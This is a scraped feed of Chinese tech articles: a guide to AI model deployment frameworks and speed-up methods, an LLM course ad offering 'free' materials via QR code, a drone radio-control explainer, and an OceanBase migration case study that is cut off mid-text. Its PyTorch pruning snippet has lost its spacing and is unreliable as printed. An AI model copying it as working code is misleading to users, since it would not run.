有一个与其媲美的就是darknet，C实现)没有之一，纯C++实现非常方便部署于各种环境。适合入门，整体构架并不是很复杂。当然光看代码是不行的，直接拿项目来练手、跑起来是最好的。第一次使用可以先配配环境，要亲手来体验体验。至于项目，建议拿SSD来练手！官方的SSD就是拿Caffe实现的，改写了一些Caffe的层和组件，我们可以尝试用SSD训练自己的数据集，然后部署推理一下，这样才有意思！Libtorch (torchscript)libtorch是Pytorch的C++版，有着前端API和与Pytorch一样的自动求导功能，可以用于训练或者推理。PytorchPytorch训练出来的模型经过torch.jit.trace或者torch.jit.scrpit可以导出为.pt格式，随后可以通过libtorch中的API加载然后运行，因为libtorch是纯C++实现的，因此libtorch可以集成在各种生产环境中，也就实现了部署(不过libtorch有一个不能忽视但影响不是很大的缺点[4]，限于篇幅暂时不详说)。libtorch是从1.0版本开始正式支持的，如今是1.9版本。从1.0版本我就开始用了，1.9版本也在用，总的来说，绝大部分API和之前变化基本不大，ABI稳定性保持的不错！libtorch适合Pytorch模型快速C++部署的场景，libtorch相比于pytorch的python端其实快不了多少(大部分时候会提速，小部分情况会减速)。在老潘的使用场景中，一般都是结合TensorRT来部署，TensorRT负责简单卷积层等操作部分，libtorch复杂后处理等细小复杂op部分。基本的入门教程：利用Pytorch的C++前端(libtorch)读取预训练权重并进行预测Pytorch的C++端(libtorch)在Windows中的使用官方资料以及API：USING THE PYTORCH C++ FRONTEND[5]PYTORCH C++ API[6]libtorch的官方资料比较匮乏，建议多搜搜github或者Pytorch官方issue，要善于寻找。一些libtorch使用规范：Load tensor from file in C++ [7]TensorRTTensorRT是可以在NVIDIA各种GPU硬件平台下运行的一个C++推理框架。我们利用Pytorch、TF或者其他框架训练好的模型，可以转化为TensorRT的格式，然后利用TensorRT推理引擎去运行我们这个模型，从而提升这个模型在英伟达GPU上运行的速度。速度提升的比例是比较可观的。在GPU服务器上部署的话，TensorRT是首选！TensorRT支持的模型以及硬件平台TensorRT老潘有单独详细的教程，可以看这里：TensorRT？超详细入门指北，来看看吧！OpenVINO在英特尔CPU端(也就是我们常用的x86处理器)部署首选它！开源且速度很快，文档也很丰富，更新很频繁，代码风格也不错，很值得学习。OpenVINO toolkit在我这边CPU端场景不是很多，毕竟相比于服务器来说，CPU场景下，很多用户的硬件型号各异，不是很好兼容。另外神经网络CPU端使用场景在我这边不是很多，所以搞得不是很多。哦对了，OpenVino也可以搭配英特尔的计算棒，亲测速度飞快。详细介绍可以看这里：OpenVino初探(实际体验)NCNN/MNN/TNN/TVM有移动端部署需求的，即模型需要运行在手机或者嵌入式设备上的需求可以考虑这些框架。这里只列举了一部分，还有很多其他优秀的框架没有列出来…是不是不好选？NCNN[8]MNN[9]TNN[10]TVM[11]Tengine[12]个人认为性价比比较高的是NCNN[13]，易用性比较高，很容易上手，用了会让你感觉没有那么卷。而且相对于其他框架来说，NCNN的设计比较直观明了，与Caffe和OpenCV有很多相似之处，使用起来也很简单。可以比较快速地编译链接和集成到我们的项目中。NCNNTVM和Tengine比较复杂些，不过性能天花板也相比前几个要高些，可以根据取舍尝试。相关链接：一步一步解读神经网络编译器TVM(一)——一个简单的例子一步一步解读神经网络编译器TVM(二)——利用TVM完成C++端的部署PaddlePaddle[14]PaddlePaddle作为国内唯一一个用户最多的深度学习框架，真的不是盖。很多任务都有与训练模型可以使用，不论是GPU端还是移动端，大部分的模型都很优秀很好用。如果想快速上手深度学习，飞浆是不错的选择，官方提供的示例代码都很详细，一步一步教你教到你会为止。最后说一句，国产牛逼。还有很多框架当然除了老潘这里介绍的这些，还有很多更加优秀的框架，只不过我没有使用过，这里也就不多评论了。AI部署中的提速方法老潘这一年除了训练模型，也部署了不少模型。虽然模型速度有提升，但仍然不够快，仍然还有很多空间去提升。我的看法是，部署不光是从研究环境到生产环境的转换，更多的是模型速度的提升和稳定性的提升。稳定性这个可能要与服务器框架有关了，网络传输、负载均衡等等，老潘不是很熟悉，也就不献丑了。不过速度的话，从模型训练出来，到部署推理这一步，有什么优化空间呢？上到模型层面，下到底层硬件层面，其实能做的有很多。如果我们将各种方法都用一遍(大力出奇迹)，最终模型提升10倍多真的不是梦！有哪些能做的呢？模型结构剪枝蒸馏稀疏化训练量化训练算子融合、计算图优化、底层优化简单说说吧！模型结构模型结构当然就是探索更快更强的网络结构，就比如ResNet相比比VGG，在精度提升的同时也提升了模型的推理速度。又比如CenterNet相比YOLOv3，把anchor去掉的同时也提升了精度和速度。模型层面的探索需要有大量的实验支撑，以及，脑子，我脑子不够，就不参与啦。喜欢白嫖，能白嫖最新的结构最好啦，不过不是所有最新结构都能用上，还是那句话，部署友好最好。哦，还有提一点，最近发现另一种改变模型结构的思路，结构重参化。还是蛮有搞头的，这个方向与落地部署关系密切，最终的目的都是提升模型速度的同时不降低模型的精度。之前有个比较火的RepVgg[15]——Making VGG-style ConvNets Great Again就是用了这个想法，是工业届一个非常solid的工作。部分思想与很多深度学习推理框架的算子融合有异曲同工之处。repvgg结构老潘也在项目中使用了repvgg，在某些任务的时候，相对于ResNet来说，repvgg可以在相同精度上有更高的速度，还是有一定效果的。剪枝剪枝很早就想尝试了，奈何一直没有时间啊啊啊。我理解的剪枝，就是在大模型的基础上，对模型通道或者模型结构进行有目的地修剪，剪掉对模型推理贡献不是很重要的地方。经过剪枝，大模型可以剪成小模型的样子，但是精度几乎不变或者下降很少，最起码要高于小模型直接训练的精度。积攒了一些比较优秀的开源剪枝代码，还咩有时间细看：yolov3-channel-and-layer-pruning[16]YOLOv3-model-pruning[17]centernet_prune[18]ResRep[19]蒸馏我理解的蒸馏就是大网络教小网络，之后小网络会有接近大网络的精度，同时也有小网络的速度。再具体点，两个网络分别可以称之为老师网络和学生网络，老师网络通常比较大(ResNet50)，学生网络通常比较小(ResNet18)。训练好的老师网络利用soft label去教学生网络，可使小网络达到接近大网络的精度。印象中蒸馏的作用不仅于此，还可以做一些更实用的东西，之前比较火的centerX[20]，将蒸馏用出了花，感兴趣的可以试试。稀疏化稀疏化就是随机将Tensor的部分元素置为0，类似于我们常见的dropout，附带正则化作用的同时也减少了模型的容量，从而加快了模型的推理速度。稀疏化操作其实很简单，Pytorch官方已经有支持，我们只需要写几行代码就可以：代码语言：javascript复制defprune(model,amount=0.3):# Prune model to requested global sparsityimporttorch.nn.utils.pruneaspruneprint('Pruning model... ',end='')forname,minmodel.named_modules():ifisinstance(m,nn.Conv2d):prune.l1_unstructured(m,name='weight',amount=amount)# pruneprune.remove(m,'weight')# make permanentprint(' %.3g global sparsity'%sparsity(model))上述代码来自于Pruning/Sparsity Tutorial [21]。这样，通过Pytorch官方的torch.nn.utils.prune模块就可以对模型的卷积层tensor随机置0。置0后可以简单测试一下模型的精度…精度当然是降了哈哈！所以需要finetune来将精度还原，这种操作其实和量化、剪枝是一样的，目的是在去除冗余结构后重新恢复模型的精度。那还原精度后呢？这样模型就加速了吗？当然不是，稀疏化操作并不是什么平台都支持，如果硬件平台不支持，就算模型稀疏了模型的推理速度也并不会变快。因为即使我们将模型中的元素置为0，但是计算的时候依然还会参与计算，和之前的并无区别。我们需要有支持稀疏计算的平台才可以。英伟达部分显卡是支持稀疏化推理的，英伟达的A100 GPU显卡在运行bert的时候，稀疏化后的网络相比之前的dense网络要快50%。我们的显卡支持么？只要是Ampere architecture架构的显卡都是支持的(例如30XX显卡)。Exploiting NVIDIA Ampere Structured Sparsity with cuSPARSELt[22]How Sparsity Adds Umph to AI Inference[23]Tensor稀疏化推理流程最近的TensorRT8是支持直接导入稀疏化模型的，目前支持Structured Sparsity结构。如果有30系列卡和TensorRT8的童鞋可以尝试尝试~并且英伟达官方提供了基于Pytorch的自动稀疏化工具——Automatic SParsity[24]，总的流程来说就是：先拿一个完整的模型(dense)，然后以一定的稀疏化系数稀疏化这个模型然后基于这个稀疏化后的模型进行训练将训练后的模型导出来即可是不是很简单？相关讨论:NVIDIA’s Tensor-TFLOPS values for their newest GPUs include sparsity[25]Pruning BERT to accelerate inference[26]Which GPU(s) to Get for Deep Learning: My Experience and Advice for Using GPUs in Deep Learning[27]NVIDIA RTX 3080: Performance Test[28]量化训练这里指的量化训练是在INT8精度的基础上对模型进行量化。简称QTA(Quantization Aware Training)。量化后的模型在特定CPU或者GPU上相比FP32、FP16有更高的速度和吞吐，也是部署提速方法之一。PS：FP16量化一般都是直接转换模型权重从FP32-&gt;FP16，不需要校准或者finetune。量化训练是在模型训练中量化的，与PTQ(训练后量化)不同，这种量化方式对模型的精度影响不大，量化后的模型速度基本与量化前的相同(另一种量化方式PTQ，TensorRT或者NCNN中使用交叉熵进行校准量化的方式，在一些结构中会对模型的精度造成比较大的影响)。举个例子，我个人CenterNet训练的一个网络，使用ResNet-34作为backbone，利用TensorRT进行转换后，使用1024x1024作为测试图像大小的指标：精度/指标FP32INT8(PTQ)INT8(QTA)AP0.930.830.94速度13ms3.6ms3.6ms精度不降反升(可以由于之前FP32的模型训练不够彻底，finetune后精度又提了一些)，还是值得一试的。目前我们常用的Pytorch当然也是支持QTA量化的。不过Pytorch量化训练出来的模型，官方目前只支持CPU。即X86和Arm，具有INT8指令集的CPU可以使用：x86 CPUs with AVX2 support or higher (without AVX2 some operations have inefficient implementations)ARM CPUs (typically found in mobile/embedded devices)已有很多例子。相关文章：PyTorch Quantization Aware Training[29]Pytorch QUANTIZATION[30]那么GPU支持吗？Pytorch官方不支持，但是NVIDIA支持。NVIDIA官方提供了Pytorch的量化训练框架包，目前虽然不是很完善，但是已经可以正常使用：NVIDIA官方提供的pytorch-quantization-toolkit[31]利用这个量化训练后的模型可以导出为ONNX(需要设置opset为13)，导出的ONNX会有QuantizeLinear和DequantizeLinear两个算子：quantize_op带有QuantizeLinear和DequantizeLinear算子的ONNX可以通过TensorRT8加载，然后就可以进行量化推理：Added two new layers to the API: IQuantizeLayer and IDequantizeLayer which can be used to explicitly specify the precision of operations and data buffers. ONNX’s QuantizeLinear and DequantizeLinear operators are mapped to these new layers which enables the support for networks trained using Quantization-Aware Training (QAT) methodology. For more information, refer to the Explicit-Quantization, IQuantizeLayer, and IDequantizeLayer sections in the TensorRT Developer Guide and Q/DQ Fusion in the Best Practices For TensorRT Performance guide.而TensorRT8版本以下的不支持直接载入，需要手动去赋值MAX阈值。相关例子：ResNet-50 v1.5 for TensorFlow[32]BERT Inference Using TensorRT[33]Questions about int8 inference procedure[34]常见部署流程假设我们的模型是使用Pytorch训练的，部署的平台是英伟达的GPU服务器。训练好的模型通过以下几种方式转换：Pytorch-&gt;ONNX-&gt;trtonnx2trt[35]Pytorch-&gt;trttorch2trt[36]Pytorch-&gt;torchscipt-&gt;trttrtorch[37]其中**onnx2trt[38]**最成熟，**torch2trt[39]比较灵活，而trtorch[40]**不是很好用。三种转化方式各有利弊，基本可以覆盖90%常见的主流模型。遇到不支持的操作，首先考虑是否可以通过其他pytorch算子代替。如果不行，可以考虑TensorRT插件、或者模型拆分为TensorRT+libtorch的结构互相弥补。**trtorch[41]**最新的commit支持了部分op运行在TensorRT部分op运行在libtorch，但还不是很完善，感兴趣的小伙伴可以关注一下。常见的服务部署搭配：triton server + TensorRT/libtorchflask + PytorchTensorflow Server后记来北京工作快一年了，做了比较久的AI相关的训练部署工作，一直处于快速学习快速输出的状态，没有好好总结一下这段时间的工作内容和复盘自己的不足。所以趁着休息时间，也回顾一下自己之前所做的东西，总结一些内容和一些经验罢。同时也是抛砖引玉，看看大家对于部署有没有更好的想法。AI部署的内容还是有很多，这里仅仅是展示其中的冰山一角，对于更多相关的内容，可以关注老潘一起交流哈。看了上述介绍，如果不确定自己的方向的，可以先打打基础，先看看C++/python等，基础工具熟悉了，之后学习起来会更快。那么，如何系统的去学习大模型LLM？我在一线互联网企业工作十余年里，指导过不少同行后辈。帮助很多人得到了学习和成长。作为一名热心肠的互联网老兵，我意识到有很多经验和知识值得分享给大家，也可以通过我们的能力和经验解答大家在人工智能学习中的很多困惑，所以在工作繁忙的情况下还是坚持各种整理和分享。但苦于知识传播途径有限，很多互联网行业朋友无法获得正确的资料得到学习提升，故此将并将重要的AI大模型资料包括AI大模型入门学习思维导图、精品AI大模型学习书籍手册、视频教程、实战学习等录播视频免费分享出来。所有资料 ⚡️ ，朋友们如果有需要全套 《LLM大模型入门+进阶学习资源包》，扫码获取~篇幅有限，部分资料如下：👉LLM大模型学习指南+路线汇总👈💥大模型入门要点，扫盲必看！💥既然要系统的学习大模型，那么学习路线是必不可少的，这份路线能帮助你快速梳理知识，形成自己的体系。👉大模型入门实战训练👈💥光学理论是没用的，要学会跟着一起做，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。👉国内企业大模型落地应用案例👈💥《中国大模型落地应用案例集》收录了52个优秀的大模型落地应用案例，这些案例覆盖了金融、医疗、教育、交通、制造等众多领域，无论是对于大模型技术的研究者，还是对于希望了解大模型技术在实际业务中如何应用的业内人士，都具有很高的参考价值。（文末领取）💥《2024大模型行业应用十大典范案例集》汇集了文化、医药、IT、钢铁、航空、企业服务等行业在大模型应用领域的典范案例。👉LLM大模型学习视频👈💥观看零基础学习书籍和视频，看书籍和视频学习是最快捷也是最有效果的方式，跟着视频中老师的思路，从基础到深入，还是很容易入门的。（文末领取）👉640份大模型行业报告👈💥包含640份报告的合集，涵盖了AI大模型的理论研究、技术实现、行业应用等多个方面。无论您是科研人员、工程师，还是对AI大模型感兴趣的爱好者，这套报告合集都将为您提供宝贵的信息和启示。👉获取方式：这份完整版的大模型 LLM 学习资料已经上传CSDN，朋友们如果需要可以微信扫描下方CSDN官方认证二维码免费领取【保证100%免费】😝有需要的小伙伴，可以Vx扫描下方二维码免费领取🆓http://www.ppmy.cn/news/1540835.html相关文章无人机：无线电波控制技术！一、无线电波控制技术 
通过无线电波与无人机上的接收机进行通信。当飞手在遥控器上操作控制杆时&amp;#xff0c;这些动作会被转换为无线电波信号&amp;#xff0c;并发送给无人机上的接收机。接收机接收到信号后&amp;#xff0c;会解读控制杆的位移&amp;#xff0c;并将其转化为数字信号&amp;#…阅读更多...万家数科：零售业务信息化融合的探索｜OceanBase案例本文作者&amp;#xff1a;马琳&amp;#xff0c;万家数科数据库专家。 万家数科商业数据有限公司&amp;#xff0c;作为华润万家旗下的信息技术企业&amp;#xff0c;专注于零售行业&amp;#xff0c;在为华润万家提供服务的同时&amp;#xff0c;也积极面向市场&amp;#xff0c;为零售商及其生态系统提供全面的核…阅读更多...股市形势复杂多变，投资者该如何应对？炒股自动化&amp;#xff1a;申请官方API接口&amp;#xff0c;散户也可以 python炒股自动化&amp;#xff08;0&amp;#xff09;&amp;#xff0c;申请券商API接口 python炒股自动化&amp;#xff08;1&amp;#xff09;&amp;#xff0c;量化交易接口区别 Python炒股自动化&amp;#xff08;2&amp;#xff09;&amp;#xff1a;获取…阅读更多...基于springboot的网上服装商城推荐系统的设计与实现基于springboot的网上服装商城推荐系统的设计与实现 
开发语言&amp;#xff1a;Java 框架&amp;#xff1a;springboot JDK版本&amp;#xff1a;JDK1.8 服务器&amp;#xff1a;tomcat7 数据库&amp;#xff1a;mysql 5.7 数据库工具&amp;#xff1a;Navicat11 开发软件&amp;#xff1a;idea 
源码获取&amp;#xf…阅读更多...HTML5_引用_语法规范_开发工具_常用标签目录 1. HTML 语法规范 
1.1 基本语法概述 
1.2 标签关系 
2. HTML 基本结构标签 
2.1 第一个 HTML 网页 
1.创建新文件 
2.进行保存&amp;#xff0c;这里可以选择保存到桌面&amp;#xff0c;但是后缀名一定要是.html 
2.2 基本结构标签总结 
3. 网页开发工具 
VSCode 的使用 
VSCode 工…阅读更多...并发编程的艺术Volatile 
作用 1. 保证共享变量的可见性&amp;#xff08;volatile修饰的变量进行操作对其他线程是可见的&amp;#xff09; 2. 插入读写屏障&amp;#xff0c;防止指令重排序。 
volatile 的底层实现 以下代码是对volatile修饰的instance变量赋值的汇编语言 
volatile Singleton instance
in…阅读更多...vue后台管理系统从0到1（5）文章目录 vue后台管理系统从0到1&amp;#xff08;5&amp;#xff09;完善侧边栏修改bug渲染header导航栏 vue后台管理系统从0到1&amp;#xff08;5&amp;#xff09; 接上一期&amp;#xff0c;我们需要完善我们的侧边狼 
完善侧边栏 
我们在 element 组件中可以看见&amp;#xff0c;这一个侧边栏是符合我们…阅读更多...element plus e-table表格中使用多选,当翻页时已选中的数据丢失摘要&amp;#xff1a; 点击第一页选中两个&amp;#xff0c;再选择第二页&amp;#xff0c;选中&amp;#xff0c;回到第一页&amp;#xff0c;之前选中的要保留&amp;#xff01; element ui table 
解决办法&amp;#xff1a; :row-key“getRowKeys” &amp;#xff08;写在el-table中&amp;#xff09; 
methods中声明 ge…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:08 +0000</pubDate>
    </item>
    <item>
      <title>无人机：无线电波控制技术！</title>
      <link>https://www.ppmy.cn/news/1540834.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维无人机：无线电波控制技术！news/2025/10/31 23:18:06/一、无线电波控制技术通过无线电波与无人机上的接收机进行通信。当飞手在遥控器上操作控制杆时，这些动作会被转换为无线电波信号，并发送给无人机上的接收机。接收机接收到信号后，会解读控制杆的位移，并将其转化为数字信号，最终传输至无人机的控制系统，实现对无人机的飞行控制。二、无线电波运行算法调制技术：调制是将原始信号转换为适合传输的已调信号的过程。在无人机遥控器信号传输中，常用的调制技术包括直接序列扩频（DSSS）和正交频分复用（OFDM）等。DSSS通过扩展信号的频谱来提高抗干扰能力，适用于需要较高抗干扰性的场景。OFDM则将信号分割成多个正交子载波进行传输，以提高传输速率和频谱效率，适用于需要高速数据传输的场景。编码技术：编码是将信息转换为特定格式的代码的过程。在无人机遥控器信号传输中，编码技术用于提高信号的传输效率和可靠性。常用的编码技术包括卷积编码、块编码等，它们可以通过增加冗余信息来提高信号的抗干扰能力和纠错能力。信号处理技术：信号处理是对接收到的信号进行解调、解码和提取有用信息的过程。在无人机遥控器信号传输中，信号处理技术用于确保信号的准确传输和识别。常用的信号处理技术包括信道估计、均衡、解调、解码等，它们可以补偿信道失真、降低噪声干扰，从而确保信号的准确传输。天线技术：天线是实现无线电波发射和接收的关键部件。在无人机遥控器信号传输中，天线技术用于提高信号的传输距离和覆盖范围。常用的天线技术包括定向天线、全向天线等，它们可以根据需要选择合适的波束宽度和增益，以提高信号的传输效率。算法优化：为了进一步提高无人机遥控器信号传输的稳定性和效率，可以对算法进行优化。例如，自适应调制编码（AMC）可以根据信道条件动态调整调制编码方案，以最大化传输速率和可靠性。多输入多输出（MIMO）技术利用多个发射和接收天线来提供空间分集和复用增益，显著提高信号的传输容量和抗干扰能力。波束成形技术通过调整发射天线的权重和相位来形成定向波束，以提高信号的传输效率和覆盖范围。三、技术挑战与应对尽管无线电波控制技术在无人机遥控器中得到了广泛应用，但仍面临一些挑战：干扰问题：城市环境中无线设备众多，电磁干扰成为影响通信质量的主要因素之一。解决之道在于使用更高级的抗干扰技术和动态频率选择技术。安全威胁：无线信号可能被黑客截取或篡改，威胁无人机的操控安全。加密通信、身份验证机制及定期软件更新是必要的安全防护措施。信号覆盖与稳定性：远距离飞行时，保持信号的连续性和稳定性是一大难题。采用多频段通信、增强型天线设计以及智能路由算法可有效提升通信质量。http://www.ppmy.cn/news/1540834.html相关文章万家数科：零售业务信息化融合的探索｜OceanBase案例本文作者&amp;#xff1a;马琳&amp;#xff0c;万家数科数据库专家。 万家数科商业数据有限公司&amp;#xff0c;作为华润万家旗下的信息技术企业&amp;#xff0c;专注于零售行业&amp;#xff0c;在为华润万家提供服务的同时&amp;#xff0c;也积极面向市场&amp;#xff0c;为零售商及其生态系统提供全面的核…阅读更多...股市形势复杂多变，投资者该如何应对？炒股自动化&amp;#xff1a;申请官方API接口&amp;#xff0c;散户也可以 python炒股自动化&amp;#xff08;0&amp;#xff09;&amp;#xff0c;申请券商API接口 python炒股自动化&amp;#xff08;1&amp;#xff09;&amp;#xff0c;量化交易接口区别 Python炒股自动化&amp;#xff08;2&amp;#xff09;&amp;#xff1a;获取…阅读更多...基于springboot的网上服装商城推荐系统的设计与实现基于springboot的网上服装商城推荐系统的设计与实现 
开发语言&amp;#xff1a;Java 框架&amp;#xff1a;springboot JDK版本&amp;#xff1a;JDK1.8 服务器&amp;#xff1a;tomcat7 数据库&amp;#xff1a;mysql 5.7 数据库工具&amp;#xff1a;Navicat11 开发软件&amp;#xff1a;idea 
源码获取&amp;#xf…阅读更多...HTML5_引用_语法规范_开发工具_常用标签目录 1. HTML 语法规范 
1.1 基本语法概述 
1.2 标签关系 
2. HTML 基本结构标签 
2.1 第一个 HTML 网页 
1.创建新文件 
2.进行保存&amp;#xff0c;这里可以选择保存到桌面&amp;#xff0c;但是后缀名一定要是.html 
2.2 基本结构标签总结 
3. 网页开发工具 
VSCode 的使用 
VSCode 工…阅读更多...并发编程的艺术Volatile 
作用 1. 保证共享变量的可见性&amp;#xff08;volatile修饰的变量进行操作对其他线程是可见的&amp;#xff09; 2. 插入读写屏障&amp;#xff0c;防止指令重排序。 
volatile 的底层实现 以下代码是对volatile修饰的instance变量赋值的汇编语言 
volatile Singleton instance
in…阅读更多...vue后台管理系统从0到1（5）文章目录 vue后台管理系统从0到1&amp;#xff08;5&amp;#xff09;完善侧边栏修改bug渲染header导航栏 vue后台管理系统从0到1&amp;#xff08;5&amp;#xff09; 接上一期&amp;#xff0c;我们需要完善我们的侧边狼 
完善侧边栏 
我们在 element 组件中可以看见&amp;#xff0c;这一个侧边栏是符合我们…阅读更多...element plus e-table表格中使用多选,当翻页时已选中的数据丢失摘要&amp;#xff1a; 点击第一页选中两个&amp;#xff0c;再选择第二页&amp;#xff0c;选中&amp;#xff0c;回到第一页&amp;#xff0c;之前选中的要保留&amp;#xff01; element ui table 
解决办法&amp;#xff1a; :row-key“getRowKeys” &amp;#xff08;写在el-table中&amp;#xff09; 
methods中声明 ge…阅读更多...99. UE5 GAS RPG 被动技能实现在这一篇&amp;#xff0c;我们在之前打下的基础下&amp;#xff0c;实现一下被动技能。 被动技能需要我们在技能栏上面选择升级解锁技能后&amp;#xff0c;将其设置到技能栏&amp;#xff0c;我们先增加被动技能使用的标签。 FGameplayTag Abilities_Passive_HaloOfProtection; //被动技能-守护光…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:06 +0000</pubDate>
    </item>
    <item>
      <title>万家数科：零售业务信息化融合的探索｜OceanBase案例</title>
      <link>https://www.ppmy.cn/news/1540833.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维万家数科：零售业务信息化融合的探索｜OceanBase案例news/2025/10/31 23:18:04/本文作者：马琳，万家数科数据库专家。万家数科商业数据有限公司，作为华润万家旗下的信息技术企业，专注于零售行业，在为华润万家提供服务的同时，也积极面向市场，为零售商及其生态系统提供全面的核心业务系统解决方案及运维服务。核心业务领域涵盖了数据服务与SaaS产品、业务洞察咨询服务、以及精准营销与相关服务。应对零售业务的技术挑战华润万家是1984年在香港成立了第一家门店，至今已有40年的历史了。在整体零售业务的发展的过程中，系统从最初简单的进销存系统演变为如今多套系统的配合，比如物流供应链，会员系统、线上业务系统。但由于新老系统的交替运行积攒了各种各样的问题，我们总结为以下四类：多系统并行，导致数据孤岛。用户体验降低，由于线下门店与线上渠道的联动及业务融合，加上用户需求多样化，系统的响应速度与易用性逐渐难以满足用户要求。链路复杂，导致故障排查困难，产生性能瓶颈。系统可扩展性受限。受限于技术架构和成本压力，系统扩展能力较差。挑战1：多系统并行。这是一个绕不开的话题，跟随业务发展阶段的演变，系统也从最初的套装系统转变为Java定制开发，使用了多种不同的数据库，如IBM informix、Oracle、MySQL等。不同数据库的差异化非常大，以至于不同团队需要频繁沟通，制定统一交互协议，确保数据流转顺畅，这会耗费大量的时间和精力。同时，对于各个系统之间的技术架构、数据格式、接口规范差异，也需要定制化开发适配器和中间件，增加了集成难度。长此以往，业务量在增长，各业务系统之间的资源耗费也随之加剧，带来了成本压力，各团队需要合理分配硬件资源、网络带宽，优化系统配置，减少资源冲突，提升整体性能。挑战2：用户体验降低。用户体验分为内部用户和外部用户，但总体而言，可以总结为三点要求。第一，个性化需求。不同用户对系统的功能、界面、操作方式等有不同的需求，满足个性化需求难度较大。第二，响应速度。用户要求系统的响应速度越来越快，尤其是在高并发情况下，但保证系统的快速响应是一个挑战。第三，易用性。系统的复杂功能可能导致用户操作困难，降低用户体验。挑战3：链路复杂。由于各系统在数据传输过程中存在各种各样的问题。导致故障点难定位，需要经过多环节排查，增加修复时间，而且链路中某环节容易造成瓶颈，影响整体性能，需要优化资源配置。作为运维人员，利用监控手段定位问题，然而某些监控盲点需要一个更强大的运维团队做实时分析，这十分考验监控运维团队对业务的理解能力。更关键的是复杂链路提升了被攻击的风险，加强安全防护措施，确保系统安全也是需要重点关注的。挑战4：系统可扩展性受限。原有的数据库由于其架构特性，难以应对业务增长后带来的性能需求，同时随着系统规模的不断扩展，代码的复杂度增加，导致维护难度加大。如果扩展系统，不仅需要投入大量的资金，还需要大量的人力资源支持，企业要面临的成本压力极大，这也成为了限制企业发展的主要矛盾。应对策略与具体措施数科技术团队选择从硬件、操作系统、数据库、开发思想等多方面入手，如硬件选择国产X86、ARM架构；操作系统选择如龙蜥、麒麟等国产可控系统；开发引入领域驱动设计思想（DDD）等，各方面持续优化现有软硬件架构。数据库选择上数科技术团队考察了很多数据库产品。并在调研后选择将原有的数据库替换为原生分布式数据库OceanBase（数据库选型与测评详见博客https://open.oceanbase.com/blog/9690209104）。引入新技术OceanBase的历程与收益在2022年6月，万家数科引入OceanBase 3.x版本，并开始POC测试、核心系统验证，直至2022年12月。彼时了解到单机分布式一体化的OceanBase 4.0版本即将发布，便等到新版本发布后及时跟进了系统迁移测试，经过几个月生产环境的上线实践，取得的效果让我们非常满意。在2024年将大批系统迁移到OceanBase数据库，将其作为技术底座。无论是新项目的生产与开发，还是旧项目的迁移，目前万家数科已有五六十个项目使用OceanBase，未来将有更多的项目建立在OceanBase数据库之上。具体收益总结为以下5点。成本节约：高压缩存储技术，原存储迁移后容量降低约60%，硬件成本节约50%，业务综合成本节约25%左右。资源有效利用率提高：使用集群汇聚多个实例，多租户资源隔离，减少资源碎片，充分利用资源。改善业务韧性，开发效率提升：优化业务架构，统一技术栈，降低开发难度，提升开发效率，增强业务稳态和扩展性。相比此前整个运维团队都忙于稳固MySQL集群，现在大家轻松多了。性能提升与混合分析：解除当前架构中的性能瓶颈，系统性能提升70%，同时支持实时报表查询，减少了数据链路开发与维护的工作，兼备混合分析场景的支持。运维效率提升：数据库平台化管理，支持DBA白屏化操作，提升了运维效率，降低了运维工具开发和运维成本。数据库迁移经验解析使用OMS（OceanBase迁移工具）进行数据库迁移方案。原MySQL集群是基于中间件的多实例分库分表集群迁移OceanBase。从迁移策略来说，使用OMS将多条链路分步汇聚到OceanBase。按照读写分离策略，先迁移读业务，后迁移写业务，这样的优点是系统稳定性较高，业务平滑地过渡至新系统。最大化地保障用户体验，让用户对系统变动无感知。在切割方案中，数科技术团队对读写业务进行应用改造以适配双数据源，设置合理的规则，在整个迁移过程中分批次进行业务迁移，直到迁移完成。这样做的好处是，可以把整个业务的迁移风险降到最低。第一步只是利用小部分流量做迁移测试，确定没问题后再进行后续步骤逐一迁移读写业务。每步迁移过程在10秒内即可完成业务迁移，对业务影响极低。在迁移过程中，合库合表是较为棘手的问题，这是MySQL 分库分表集群迁移 OceanBase 必须考虑的问题。不仅需要对每张大表检查验证，确认每条数据的唯一性，并配置合适的大表分区键，确认热点 SQL 